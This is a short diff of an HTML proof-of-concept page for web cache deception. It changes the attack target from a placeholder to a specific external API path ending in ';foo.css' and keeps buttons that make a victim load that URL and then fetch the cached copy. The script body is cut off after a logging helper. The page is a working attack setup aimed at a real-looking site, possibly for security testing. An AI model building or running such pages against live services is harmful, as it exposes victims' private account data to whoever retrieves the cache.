@@ -1,21 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Web Cache Deception PoC</title>
+    <title>WCD</title>
 </head>
 <body>
-<h1>Web Cache Deception PoC</h1>
+<h1>PoC</h1>
 
-<p>This page forces the victim to load a cache-poisoning URL and then attempts to retrieve the cached response.</p>
+<p>victim page</p>
 
-<button onclick="triggerVictimRequest()">1. Load Victim Request</button>
-<button onclick="fetchCached()">2. Fetch Cached Content</button>
+<button onclick="triggerVictimRequest()"> Victim Request</button>
+<button onclick="fetchCached()">2. Fetch cached content</button>
 
 <pre id="output"></pre>
 
 <script>
     // Replace this with your target endpoint
-    const TARGET = "https://TARGET.COM/account/settings.css;/";
+    const TARGET = "https://api.syfe.com/promo/referral/SRPSBRUQC;foo.css";
 
     function log(msg) {
         document.getElementById("output").textContent += msg + "\n";
